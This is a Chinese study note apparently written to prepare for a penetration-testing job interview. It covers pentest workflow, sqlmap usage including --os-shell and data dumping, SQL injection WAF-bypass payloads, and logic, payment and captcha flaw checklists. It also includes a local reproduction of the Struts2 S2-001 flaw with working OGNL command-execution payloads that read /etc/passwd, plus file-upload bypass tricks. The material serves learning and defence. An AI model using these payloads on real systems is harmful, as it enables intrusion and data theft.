# 简历回答

**（web安全学习笔记）https://websec.readthedocs.io/zh/latest/index.html**



# 1、渗透测试流程和方法：

> - ## 项目前期准备工作
>
> - ## 信息收集：
>
>   - ### whois（万网、站长之家）：用来查询[域名](https://baike.baidu.com/item/域名/86062)的IP以及[所有者](https://baike.baidu.com/item/所有者/2193463)等信息，查询[域名](https://baike.baidu.com/item/域名/86062)是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、[域名注册](https://baike.baidu.com/item/域名注册)商）
>
>   - ### 网站源ip
>
>     - ##### 判断ip是否为真实ip：
>
>       - *Nslookup：*Win下使用nslookup命令进行查询，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。
>       - *多地ping查询*：使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。
>
>     - ##### 如何绕过CDN查询真实ip：
>
>       - *DNS历史解析记录*：可能会找到网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：
>
>         ```
>         iphistory：https://viewdns.info/iphistory/
>         DNS查询：（https://dnsdb.io/zh-cn/）
>         微步在线：（https://x.threatbook.cn/）
>         域名查询：（https://site.ip138.com/）
>         DNS历史查询：（https://securitytrails.com/）
>         Netcraft：https://sitereport.netcraft.com/?url=github.com
>         ```
>
>       - *查找子域名：*搜索引擎查询
>
>       - *网站邮件头信息：*通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP
>
>       - *国外主机解析域名*：大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有
>
>       - *扫描全网*
>
>   - ### 旁站：目标网站无法拿下时，找和目标网站同服务器下的某一个网站，从那里突破拿到旁站的webshell然后再突破权限拿到目标站
>
>   - ### 服务器系统版本：
>
>     - ##### wireshark抓包
>
>     - ##### wget -S URL（\# wget -S www.xunlei.com）
>
>     - ##### curl -I URL（# curl -I www.xunlei.com）
>
>   - ### 数据库类型：SQL注入错误反馈信息判别是mysql还是其他的（报错有mysql的关键字的是mysql）
>
>   - ### 二级域名：．com．cn”域名结构中，“.com”此时是置于国家顶级域名“.cn”下的二级域名
>
>   - ### 防火墙（检查是否有墙，黑白名单绕过）
>
>   - ### 维护者信息（whois查询）
>
>   - ### 容器版本：cat命令查看
>
> - ## 漏洞扫描：
>
>   - ### Nessus：负责解决补丁，软件问题，恶意软件和[广告软件删除工具](https://gbhackers.com/best-adware-removal-tool/)以及各种操作系统和应用程序上的错误配置
>
>   - ### AWVS：AWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。
>
> - ## 手动挖掘：逻辑漏洞
>
> - ##  验证漏洞
>
> - ## 修复建议 
>
> - ## 输出报告



# 2、监测工作





# 3、sqlmap工具的使用

> - ### 常用语句
>
>   - 自动检测
>
>     `sqlmap -u http:/xxxxxx.xxx -batch`
>
>   - 指定参数
>
>     `sqlmap -u http:/xxxxxx.xxx/?id=x&param=x -p id`
>
>   - 指定数据库类型
>
>     `sqlmap -u http:/xxxxxx.xxx –dbms mysql`
>
>   - 从文件读取http请求报文
>
>     `sqlmap -r 1.txt -batch`
>
>   - 设置cookie
>
>     `sqlmap -u http:/xxxxxx.xxx --cookie="JSESSION=asd"`
>
>   - 查询数据库
>
>     `sqlmap -u http:/xxxxxx.xxx --dbs`
>
>   - 查询表
>
>     `sqlmap -u http:/xxxxxx.xxx -D 数据库名 --tables`
>
>   - 查字段名
>
>     `sqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 --columns`
>
>   - 爆数据
>
>     `sqlmap -u http:/xxxxxx.xxx -D 数据库名 -T 表名 -C "字段名1，字段名2"--dump`
>
>   - 在数据库中搜索字段 / 表 / 数据库名
>
>     `sqlmap -u http:/xxxxxx.xxx --search -C/T/D admin,password`
>
>   - 写入文件
>     `sqlmap -u http://xxx.xxx -–file-dest "要写入的文件在本地的路径" –file-write "目标路径"`
>
>   - 调用shell
>
>     `sqlmap -u http://xxx.xxx --os-shell`





# 4、mysql常用函数：

> ### 常用函数
>
> ```sql
> length()                     //返回字符串长度
> substr()                     //截取字符串长度
> ascii()                      //返回ASCII码
> ord()                        //返回字符串第一个字符的ascii值
> rand()                       //返回0和1之间的一个随机数
> hex()                        //把字符串转换为十六进制
> unhex()                      //hex的反向操作
> mid()                        //返回一个字符串的一部分
> left()                       //返回字符串最左面几个字符
> now()                        //当前系统时间
> floor()                      //返回不大于x的最大整数值
> md5()                        //返回MD5值
> count()                      //返回执行结果数量
> concat()                     //没有分隔符的链接字符串
> concat_ws()                  //含有分隔符的链接字符串
> group_concat                 //返回带有来自一个组的连接的非NULL值的字符串结果
> strcmp(a,b)                  //将a和b比较，小的话返回1，等于的话返回0，大于的话返回-1
> ```
>
> ### 内置函数
>
> ```sql
> @@datadir                    //读取数据库路径
> @@basedir                    //MySQL安装路径
> @@version_compile_os    	 //操作系统
> @@secure_file_priv           //查看数据库secure_file_priv 的参数值
> @@character_sets_dir         //字符集安装目录
> @@character_set_server       //字符集编码格式
> ```
>
> ### 用户名
>
> ```sql
> user()                        //用户名
> current_user()                //当前用户名
> system_user()                 //系统用户名
> session_user()                //链接数据库的用户名
> ```
>
> ### 数据库
>
> ```sql
> database()                            //数据库名
> version()                             //MySQL数据库版本
> show variables like '%version_%';     //可以查询数据库的版本信息
> ```
>
> ### 读写文件
>
> ```sql
> load_file()                            //读取本地文件
> into outfile                           //写文件 
> into dumpfile                    	   //写文件
> ```



# 5、php常用函数

> ### 1.isset()函数
>
> ​	用于检测变量是否已设置并且非 NULL。
>
> ### 2.extract()函数
>
> ​	从数组中将函数导入当前列表，将数组的键当作变量名，数组的值当作对应变量的值。
>
> ### 3.file_get_contents() 函数
>
> ​	把整个文件读入一个字符串中。
>
> ### 4.eval()函数
>
> ​	把字符串按照php代码计算
>
> ### 5.assert()函数
>
> ​	判断一个表达式是否成立，返回true or false。
>
> ### 6.preg_replace() 函数
>
> ​	执行一个正则表达式的搜索和替换。
>
> ### 7.call_user_func()函数
>
> ​	把第一个参数作为回调函数调用，并且将其余的参数作为回调函数的参数。
>
> ### 8.require()、include()、require_once()、include_once()函数
>
> ​	包括并运行指定文件。
>
> ### 9.exec()函数
>
> ​	执行一个外部程序
>
> ### 10.passthru()函数
>
> ​	执行外部程序并且显示原始输出
>
> ### 11.proc_open()函数
>
> ​	执行一个命令，并且打开用来输入/输出的文件指针。
>
> ### 12.shell_exec()函数
>
> ​	通过shell环境执行命令，并且将完整的输出以字符串的方式返回
>
> ### 13.system()函数
>
> ​	执行外部程序，并且显示输出
>
> ### 14.popen()函数
>
> ​	通过popen()的参数传递一条命令，并对popen()所打开的文件进行执行
>
> ### 15.copy()函数
>
> ​	拷贝文件
>
> ### 16.file_get_contents()函数
>
> ​	将整个文件读入一个字符串
>
> ### 17.file_put_contents()函数
>
> ​	将一个字符串写入文件
>
> ### 18.file()函数
>
> ​	把整个文件读入一个数组中
>
> ### 19.fopen()函数
>
> ​	打开文件或者URL
>
> ### 20.move_uploaded_file()函数
>
> ​	将上传的文件移动到新位置
>
> ### 21.readfile()函数
>
> ​	读取一个文件，并写入到输出缓冲。
>
> ### 22.rename()函数
>
> ​	重命名一个文件或目录
>
> ### 23.rmdir()函数
>
> ​	删除目录
>
> ### 24.unlink() & delete()函数
>
> ​	删除文件
>
> ### 25.in_array()函数
>
> ​	搜索数组中是否存在指定的值。
>
> ### 26.ini_set()函数
>
> ​	设置php.ini的值
>
> ### 27.ini_get()函数
>
> ​	获取php.ini文件里的环境变量的值
>
> ### 28.is_*()函数
>
> ​	is_array — 检测变量是否是数组
>
> ​	is_bool — 检测变量是否是布尔型
>
> ​	is_callable — 检测参数是否为合法的可调用结构
>
> ​	is_dir — 判断给定文件名是否是一个目录
>
> ​	is_double — is_float() 的别名
>
> ​	is_float — 检测变量是否是浮点型
>
> ​	is_file — 判断给定文件名是否为一个正常的文件
>
> ​	is_int — 检测变量是否是整数
>
> ​	is_null — 检测变量是否为NULL
>
> ​	is_numeric — 检测变量是否为数字或数字字符串
>
> ​	is_object — 检测变量是否是一个对象
>
> ​	is_string — 检测变量是否是字符串



# 6、SQL注入绕过waf

> #### 在渗透的过程当中，最核心的就是构造自己的输入，然后分析目标返回的结果，从而判断出是否存在相应的问题。
>
> #### WAF的基础检测机制也基于此——检测用户输入的内容，如果输入的内容中包含了一些危险字符，或者说有威胁性的字符，那么WAF就会对此进行拦截。



> - ### 双写绕过
>
>   - 有些waf会对关键词进行过滤，若只过滤1次，则可以双写绕过。
>
> - ### 等号like绕过
>
>   - 有的waf会对等于号进行拦截和过滤。
>
> - ### and/or绕过
>
>   - 主流的 waf 都会对and 、or、xor进行拦截。替代字符：and 等于&&、or 等于 ||、not 等于 !、xor 等于|
>
> - ### union select （组合法）绕过
>
>   - uNIoN /\*!%53eLEct\*/ # url 编码与内联注释
>   - uNIoN se%0blect # 使用空格绕过
>   - uNIoN sele%ct # 使用百分号绕过
>   - uNIoN %53eLEct # 编码绕过
>   - uNIoN sELecT 1,2 #大小写绕过
>   - /\!union\*//\*!select\*/1,2 # 内联注释绕过
>
> - ### 逗号绕过
>
>   - 变换函数的形式，比如 substr(database(),1,1)—> substr(database() from 1 for 1) 
>   - limit 0,1 —> limit 1 offset 0
>
> - ### 浮点数绕过
>
>   - 通过浮点数的形式从而绕过。id=1 union select —> id=1.0union select —> id=1E0union select
>
> - ### ascii编码绕过
>
>   - waf有的时候会对截取的字符拦截，可以使用ascii编码对比进行绕过。
>
> - ### base64编码绕过
>
>   - waf有的时候会对截取的字符拦截，可以将注入的语句进行base64编码进行绕过
>
> - ### 内联注释绕过
>
>   - 通杀的，内联注释，如 /*!select*/ 
>
> - ### 空格字符绕过
>
> - ### 引号字符绕过
>
>   - 若单引号被拦截，则使用双引号，若都被拦截，就尝试使用hex六进制编码，也可以考虑宽字节注入绕过
>
> - ### 脏数据溢出绕过
>
>   - 数据太多超过waf检测范围，然后造成绕过，如果是GET传参，参数值超过GET所能运行的长度可能无法利用，所以最好是POST传参
>
> - ### 黑白名单绕过



# 7、OWASP TOP 10 （2017）https://blog.csdn.net/qq_52469895/article/details/124289044

> - #### 1、注入
>
> - #### 2、失效的身份认证
>
> - #### 3、敏感数据泄露
>
> - #### 4、XML 外部实体（XXE）
>
> - #### 5、失效的访问控制
>
> - #### 6、安全配置错误
>
> - #### 7、跨站脚本（XSS）
>
> - #### 8、不安全的反序列化
>
> - #### 9、使用含有已知漏洞的组件
>
> - #### 10、不足的日志记录和监控

> # （2021）https://blog.csdn.net/wyyylqy/article/details/123660609
>
> - ## 访问控制失效
>
> - ## 加密机制失效
>
> - ## 注入式攻击
>
> - ## 不安全设计
>
> - ## 安全错误配置
>
> - ## 易受攻击和已淘汰的组件
>
> - ## 失效的身份认证
>
> - ## 软件和数据完整性故障
>
> - ## 安全记录和监控失效
>
> - ## 服务器请求伪造 SSRF





# 8. 逻辑漏洞 / 业务漏洞

## 8.1. 简介

逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。

在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。

## 8.2. 安装逻辑

- 查看能否绕过判定重新安装
- 查看能否利用安装文件获取信息
- 看能否利用更新功能获取信息

## 8.3. 交易

### 8.3.1. 购买

- 修改支付的价格
- 修改支付的状态
- 修改购买数量为负数
- 修改金额为负数
- 重放成功的请求
- 并发数据库锁处理不当

### 8.3.2. 业务风控

- 刷优惠券
- 套现

## 8.4. 账户

### 8.4.1. 注册

- 覆盖注册
- 尝试重复用户名
- 注册遍历猜解已有账号

### 8.4.2. 密码

- 密码未使用哈希算法保存
- 没有验证用户设置密码的强度

### 8.4.3. 邮箱用户名

- 前后空格
- 大小写变换

### 8.4.4. Cookie

- 包含敏感信息
- 未验证合法性可伪造

### 8.4.5. 手机号用户名

- 前后空格
- +86

### 8.4.6. 登录

- - 撞库

    设置异地登录检查等机制

- 账号劫持

- - 恶意尝试帐号密码锁死账户

    需要设置锁定机制与解锁机制

- 不安全的传输信道

- 登录凭证存储在不安全的位置

### 8.4.7. 找回密码

- 重置任意用户密码
- 密码重置后新密码在返回包中
- Token验证逻辑在前端
- X-Forwarded-Host处理不正确
- 找回密码功能泄露用户敏感信息

### 8.4.8. 修改密码

- 越权修改密码
- 修改密码没有旧密码验证

### 8.4.9. 申诉

- 身份伪造
- 逻辑绕过

### 8.4.10. 更新

- ORM更新操作不当可更新任意字段
- 权限限制不当可以越权修改

### 8.4.11. 信息查询

- 权限限制不当可以越权查询
- 用户信息ID可以猜测导致遍历

## 8.5. 2FA

- 重置密码后自动登录没有2FA
- OAuth登录没有启用2FA
- 2FA可爆破
- 2FA有条件竞争
- 修改返回值绕过
- 激活链接没有启用2FA
- 可通过CSRF禁用2FA

## 8.6. 验证码

- 验证码可重用
- 验证码可预测
- 验证码强度不够
- 验证码无时间限制或者失效时间长
- 验证码无猜测次数限制
- 验证码传递特殊的参数或不传递参数绕过
- 验证码可从返回包中直接获取
- 验证码不刷新或无效
- 验证码数量有限
- 验证码在数据包中返回
- 修改Cookie绕过
- 修改返回包绕过
- 验证码在客户端生成或校验
- 验证码可OCR或使用机器学习识别
- 验证码用于手机短信/邮箱轰炸

## 8.7. Session

- Session机制
- Session猜测 / 爆破
- Session伪造
- Session泄漏
- Session Fixation

## 8.8. 越权

- - 未授权访问

    静态文件通过特定url来防止被访问

- - 水平越权

    攻击者可以访问与他拥有相同权限的用户的资源权限类型不变，ID改变

- - 垂直越权

    低级别攻击者可以访问高级别用户的资源权限ID不变，类型改变

- - 交叉越权

    权限ID改变，类型改变

## 8.9. 随机数安全

- 使用不安全的随机数发生器
- 使用时间等易猜解的因素作为随机数种子

## 8.10. 其他

- 用户/订单/优惠券等ID生成有规律，可枚举
- 接口无权限、次数限制
- 加密算法实现误用
- 执行顺序
- 敏感信息泄露





# 9、验证码绕过

> - ### 验证码使用后不会销毁
>
>   - 验证码可重复使用，导致可爆破账户
>
> - ### 生成验证码字符集可控
>
>   - 验证码可控，可自行选择验证码
>
> - ### 验证码存放在暴露位置
>
>   - 比如cookie里面，或者藏到编码后的某些值里面，藏到图片的字节里面等（有时也会进行加密编码藏起来）
>
> - ### 验证码为空，或者8888，0000等可绕过
>
>   - 验证码为空，是因为程序逻辑错误，验证码验证一次之后本该退出此次验证码，生成新的，由于没有生成新的继续验证密码是否正确 
>   - 8888,0000等为开发程序时设置的万能密码，方便测试，有时候会忘记删除 
>   - 1111 2222 3333 4444 5555 6666 7777 8888 9999  
>
> - ### 其他对比后验证码未销毁
>
>   - 仅仅校验了密码字段和验证码,用户名并未校验,那么这里就可以输入一个弱密码（如123456,111111,123123等等）,然后反向去遍历用户,获取正确的口令。 
>
> - ### 验证码尺寸可控 
>
>   - 该问题被人们广为关注源于PHPcms早期版本的后台登录验证码尺寸可控,可用于DDoS。 
>
> - ### 验证码过于简单,可轻易机器识别 
>
>   - 如良精南方都可识别 
>
> - ### 仅在客户端生成验证码
>
>   - 有的网站验证码由本地js生成仅仅在本地用js验证。
>
> - ### 验证码自动识别
>
>   - 但是验证码功能薄弱，可以被工具识别
>   - 击F12打开开发者工具，查看前端源码，找到生成验证码的URL。
>     - <img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述" style="zoom: 67%;" />
>   - 将URL输入[搜索框](https://so.csdn.net/so/search?q=搜索框&spm=1001.2101.3001.7020)，验证是否正确。
>     - <img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70-16544118522587.png" alt="在这里插入图片描述" style="zoom:67%;" />
>   - 然后，打开工具`PKAV HTTP FUzzer`，开始尝试自动识别验证码。
>     - <img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70-16544118693829.png" alt="在这里插入图片描述" style="zoom:67%;" />
>     - <img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70-165441188079211.png" alt="在这里插入图片描述" style="zoom: 67%;" />
>
> - ### 验证码爆破登录
>
>   - 首先，使用Burp Suite抓包，把数据包丢进PKAV工具，给标记的变量添加猜测字典，设置参数，开始自动识别测试，进行爆破。

> ## **修复方法：** 
>
> - #### 验证码设置为6位并设置超时（一分钟）失效。 
>
> - #### 建议修改应用程序源代码，在登录模块中增加对验证码正确性的验证，并且要保证在验证用户名、密码或其他信息之前首先验证验证码的正确性



# 10、支付漏洞https://zhuanlan.zhihu.com/p/88525774

> ### **0x01.修改支付价格**
>
> 这个是最常见的，一般在支付当中，选择完要购买的商品，确认支付的时候，用抓包软件抓包，有些支付接口抓包的时候可能存在干扰包，一定要细心观察是哪个数据包，定位到这个数据包，直接修改支付金额。0.01或者1，或者负数。都可以一一尝试。修改完之后直接放包观察是否修改成功。
>
> ### **0x02.修改运费或者物品数量**
>
> 有时候在修改支付价格的时候不行，就可以尝试修改一下运费或者物品数量，修改方式都可以参考第一个思路，有些企业在做支付漏洞的防范时可能只着重了支付金额的逻辑，并没有对运费以及数量做相关限制。
>
> ### **0x03.整数溢出**
>
> 一般在开发当中，商品的金额都会用int 型来定义，那么 int 的最大值为2147483647，可以尝试修改为2147483648。看是否造成整数溢出，有可能支付状态异常，从而导致支付成功。
>
> ### **0x04.修改支付账户**
>
> 有时候在测一些有钱包的站或者直接从个人账户扣款的站时，可以观察下支付包代表的是账户 id，可以尝试修改 id。可以理解成越权让别人帮你支付漏洞。(当然也有可能越权帮别人支付订单)。
>
> ### **0x05.并发操作**
>
> 这个思路就是在买一个商品的时候，支付操作抓包，高并发环境下反复多次购买，有可能会造成比如10块钱的东西，高并发操作下，花10块钱买了很多个。高并发在很多操作下都很适用。
>
> ### **0x06.修改优惠券金额**
>
> 在挖支付的时候，大多都是些 p2p，商城之类的，一般都会存在优惠券之类的，可以在支付的时候尝试修改优惠券金额或者数量，看下是否可以造成0元购买甚至负数购买。这个套路在一些积分抵扣之类的都可以用。
>
> ### **0x07.替换商品id**
>
> 这个也是比较常用的一种思路，有些时候在测支付的时候，可以抓其他商品包看一下这个商品的 id 是多少，比如抓一个便宜的商品，获取到 id 保存下来，然后找一个贵的购买抓包替换下 id 看下是否金额会变化。
>
> ### **0x08.修改支付状态**
>
> 这种漏洞属于比较奇葩的，在前端进行验证，但是还是个别站会有，在点击购买之后抓返回包，一般看返回包中包含 flase 或者0之类的可以改成 true 或者1。就有可能绕过前端验证，购买成功。



# 11、工具

> - ### Burp Suite：https://t0data.gitbooks.io/burpsuite/content/#5F
>
>   - ##### 用于测试网络应用程序安全性的图形化工具，它作为一个 Web 代理服务器运行，并且位于浏览器和目标 Web 服务器之间。这允许拦截、检查和修改在两个方向上通过的原始流量。
>
> - ### 御剑：https://blog.csdn.net/qq_45076423/article/details/103018509
>
>   - ##### 主要是扫描网站敏感目录，包括网站后台等。其扫描原理也是爆破，即通过敏感目录的字典去匹配。 御剑后台扫描之前，[爬虫](https://so.csdn.net/so/search?q=爬虫&spm=1001.2101.3001.7020)会访问robots txt文件。
>
> - ### dirsearch：基于python https://www.whbwiki.com/316.html
>
>   - ##### 旨在对web服务器中的目录和文件进行暴力破解。它和我们平时使用的dirb、御剑等工具一样，就是为了扫描网站的敏感文件和目录从而找到突破口
>
> - ### **Nmap**（**设计目标是快速地扫描大型网络**）https://zh.m.wikipedia.org/zh/Nmap
>
>   - ##### 1、主机的发现
>
>     ##### 2、端口开放/关闭扫描
>
>     ##### 3、服务版本侦测
>
>     ##### 4、OS操作系统侦测
>
>   - ##### nmap是信息搜集用的，nessus是扫漏洞的。
>
> - ### fofa（网络空间资产检索系统）：探索全球互联网的资产信息，进行资产及漏洞影响范围分析、应用分布统计、应用流行度态势感知等。
>
>   - ##### 比如我们想搜索开放3389端口并且位于中国的IP，对应的语法就是port="3389" && country=CN
>
>   - | title="beijing"        | 从标题搜索北京                                    |
>     | ---------------------- | ------------------------------------------------- |
>     | header="elastic"       | 从http头中搜索“elastic”                           |
>     | body="网络空间测绘"    | 从html正文中搜索“网络空间测绘”                    |
>     | domain="qq.com"        | 搜索根域名带有qq.com的网站。                      |
>     | icon_hash="-247388890" | 搜索使用此icon的资产。                            |
>     | host=".gov.cn"         | 从url中搜索”.gov.cn”                              |
>     | is_honeypot=true       | 查询蜜罐资产                                      |
>     | ip="220.181.111.1/24"  | 查询IP为“220.181.111.1”的C网段资产                |
>     | port=“443”             | 查找对应443端口的资产。例： 查找对应443端口的资产 |

> - ### **冰蝎（Behinder 3.0）**：webshell工具
>
>   - ##### webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作
>
>   - ##### 一句话木马后门
>
> - ### **蚁剑（AntSword）**：webshell工具
>
> - ### 超级弱口令：想用密码库批量检测一下域内的弱密码
>
> - ### John the Ripper 
>
>   - ##### 是一款免费开源的密码破解工具，破解弱口令
>
>   
>
> - ### Nessus：
>
>   - ##### 负责解决补丁，软件问题，恶意软件和[广告软件删除工具](https://gbhackers.com/best-adware-removal-tool/)以及各种操作系统和应用程序上的错误配置
>
>   
>
> - ### AWVS：
>
>   - ##### AWVS可以通过检查SQL注入攻击漏洞、XSS跨站脚本攻击漏洞等漏洞来审核Web应用程序的安全性。
>
> 
>
> - ### Pkav HTTP Fuzzer：
>
>   - ##### 验证码识别工具





# 12、自我介绍

> ​	您好，很荣幸有机会参加公司的面试。
>
> ​	我叫李子昂，家乡是在山东，就读于华北科技学院，专业是网络工程，今年22岁。因为比较喜欢网络空间安全和网络开发，所以来面试这个职位。
>
> ​	首先呢我觉得自己面试护网这个职位的一个很大的原因是专业技能方面，首先在学校是我在物联网工程实验室和一群同学一起工作，原先呢我在实验室跟老师做的是深度学习和数据挖掘以及后端的方向。
>
> ​	在这期间在实验室里接触了很多网络空间安全研究方面的一些研究生，经常谈论一些网络安全方面的事情。这也让我逐渐的了解到不论是做前后端也好还是以一个普通人的身份也好去使用日常的网站和软件。安全问题已经变得越来越重要了。从而从一开始的方向逐渐开始对网络安全感兴趣，
>
> ​	经过一定时间的积累，能够比较熟悉渗透测试的流程和方法以及网络攻击的监测工作，熟悉sqlmap等一些工具的使用，Sql注入能绕过一些简单的waf，熟悉一些常见的业务逻辑漏洞等
>
> ​	我实习的这段时间的项目经历是在一个省市级的系统渗透测试中呢，重点是挖掘出了弱口令以及逻辑漏洞，另一个是在湖南省的某市政府网站渗透中，挖掘出了多个业务逻辑漏洞，像这个系统的任意密码修改，任意用户注册，支付逻辑漏洞等。还有这个市司法局的搜索框，存在着sql注入，此市的附属学校也存在着sql注入。
>
> ​	然后是综合素质方面，我在学生会担任过职位，对于一些活动的流程比较熟悉，也熟悉怎样更高效的交流。另外我对工作充满热情，不喜欢半途而废，尽最大的努力为公司创造价值。希望自己能满足公司的需求。
> 我的自我介绍完毕，谢谢！



# 13、项目经历

## 13.1、Struts2框架漏洞

> ### **如何判断Struts2框架**
>
> ```
> 常规的办法有：
> 
> 1、通过页面回显的错误消息来判断，页面不回显错误消息时则无效。
> 2、通过网页后缀来判断，如.do.action，有可能不准。
> 3、判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true。
> 
> 其它的方法：通过 actionErrors。要求是对应的 Action 需要继承自 ActionSupport 类。
> 
> 利用方法：如原始 URL 为 https://threathunter.org/则检测所用的 URL 为
> https://threathunter.org/?actionErrors=1111
> ```
>
> 
>
> ### S2-048 （CVE-2017-9791）
>
> 这个漏洞主要问题出在struts2-struts1-plugin这个插件包上。这个库的主要作用就是将struts1的action封装成struts2的action以便它能在strut2上运行使用。
> 而由于struts2-struts1-plugin 包中的 “Struts1Action.java” 中的 execute 函数可以调用 getText() 函数，这个函数刚好又能执行OGNL表达式，同时这个 getText() 的 参数输入点，又可以被用户直接进行控制，如果这个点被恶意攻击者所控制，就可以构造恶意执行代码，从而实现一个RCE攻击。





> ## 漏洞复现(本地)
>
> ### 3.2 S2-001远程执行代码漏洞
>
> #### **漏洞原理：**
>
> ##### 该漏洞因用户提交表单数据且验证失败时，后端会将用户之前提交的数据使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。如注册或登录页面，提交失败后一般会默认返回之前提交的数据，由于后端使用%{value}对提交的数据执行了一次OGNL表达式解析，所以可以直接构造Payload进行命令执行。
>
> #### **影响版本：**
>
> ```
>Struts 2.0.0 - 2.0.8
> ```
> 
> ##### 验证漏洞是否存在，输入
>
> ```
>%{'zcc'}
> ```
>
> ##### 返回zcc就是存在该漏洞
>
> <img src="1626014256_60eb02307d9446ea4b5f8.png!small" alt="image-20210708095826223" style="zoom:67%;" />
>
> <img src="1626014257_60eb02314f1d814097e87.png!small" alt="image-20210708095804739" style="zoom:67%;" />
>
> ##### 构造poc，填入password框：
> 
> ```
>Poc获取tomcat路径：
> %{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
>```
> 
> <img src="1626014258_60eb0232320aae0fdae0c.png!small" alt="image-20210708101433289" style="zoom:67%;" />
> 
><img src="1626014258_60eb0232eff07569d780c.png!small" alt="image-20210708135151541" style="zoom:67%;" />
> 
>#### 开启struts2-001漏洞
> 
><img src="1626014260_60eb023451749aea12b66.png!small" alt="image-20210708135805848" style="zoom:67%;" />
> 
>#### 验证是否开启
> 
>![image-20210708135910127](1626014262_60eb02363cec2477b283c.png!small)
> 
> <img src="1626014263_60eb02375d96b228384aa.png!small" alt="image-20210708140019492" style="zoom:67%;" />
> 
> #### 验证是否存在
>
> <img src="1626014264_60eb023876f2ddc4f6f1b.png!small" alt="bdbedc76421163ec734cee68dff927a" style="zoom:67%;" />
>
> <img src="1626014265_60eb0239a82b23d1dcf87.png!small" alt="322449e9453684ee7ee4226b8d99c39" style="zoom: 67%;" />
>
> #### 获取tomcat路径
>
> ```
>%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
> ```
>
> <img src="1626014266_60eb023ac448f82370118.png!small" alt="image-20210708140432678" style="zoom:67%;" />
>
> <img src="1626014267_60eb023bf27324c2d60f7.png!small" alt="image-20210708140620554" style="zoom:67%;" />
>
> #### 获取网站的真实路径
>
> ```
>%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
> ```
>
> <img src="1626014269_60eb023d24cdc4abe3652.png!small" alt="image-20210708140918567" style="zoom:67%;" />
>
> <img src="1626014270_60eb023e6f63d4a7cc561.png!small" alt="image-20210708140928436" style="zoom:67%;" />
> 
> #### 执行命令
>
> ```
>%{
> #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),
>#b=#a.getInputStream(),
> #c=new java.io.InputStreamReader(#b),
>#d=new java.io.BufferedReader(#c),
> #e=new char[50000],
> #d.read(#e),
> #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
>#f.getWriter().println(new java.lang.String(#e)),
> #f.getWriter().flush(),#f.getWriter().close()
>}
> ```
>
> <img src="1626014271_60eb023fb77107b918233.png!small" alt="image-20210708141252287" style="zoom:67%;" />
>
> <img src="1626014272_60eb0240bc31323229022.png!small" alt="image-20210708141301722" style="zoom:67%;" />
> 
> ```
> %{
> #a=(new java.lang.ProcessBuilder(new java.lang.String[]{"cat","/etc/passwd"})).redirectErrorStream(true).start(),
> #b=#a.getInputStream(),
> #c=new java.io.InputStreamReader(#b),
> #d=new java.io.BufferedReader(#c),
> #e=new char[50000],
> #d.read(#e),
> #f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),
> #f.getWriter().println(new java.lang.String(#e)),
> #f.getWriter().flush(),#f.getWriter().close()
>}
> ```
>
> <img src="1626014273_60eb0241efab877d0031f.png!small" alt="image-20210708141616746" style="zoom:67%;" />
>
> <img src="1626014275_60eb02433578ad9eac538.png!small" alt="image-20210708141958858" style="zoom:67%;" />



## 13.2、弱口令检测

> John the Ripper 是一款免费开源的密码破解工具
>
> 



## 13.3、文件上传漏洞

> ### 用户文件上传功能代码没有对上传文件的格式进行严格过滤，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 
>
> ### 用户文件上传功能代码处理缺陷
>
> 
>
> ### 危害：
>
> 操作木马文件提权 获取网站权限 
>
> 
>
> ### 如何防御：
>
> 1.后端验证：采用服务端验证模式 
>
> 2.**后缀**验证：基于白名单，黑名单过滤 
>
> 3.MIME验证：基于上传自带类型检测 
>
> 4.内容检测：文件头，完整性检测 
>
> 5.自带函数过滤
>
> 6.WAF防护软件：宝塔、云盾等 
>
> 
>
> ### 绕过方法： 
>
> #### 黑名单是定义不允许上传的扩展名, 白名单则是定义允许上传的扩展名
>
> 1.绕过黑名单验证
>
> ​	a.后缀名不完整 .php5 .phtml等 
>
> ​	b.上传.htacess **【触发getshell将。jpg解析成。php】**
>
> ​	c.大小写 
>
> ​	d.在数据包中文件后缀名前加空格 
>
> ​	e.后缀名前加. 
>
> ​	f.加上::$DATA **【windows下ADS流特性，导致上传文件xxx.php::$DATA = xxx.php】**
>
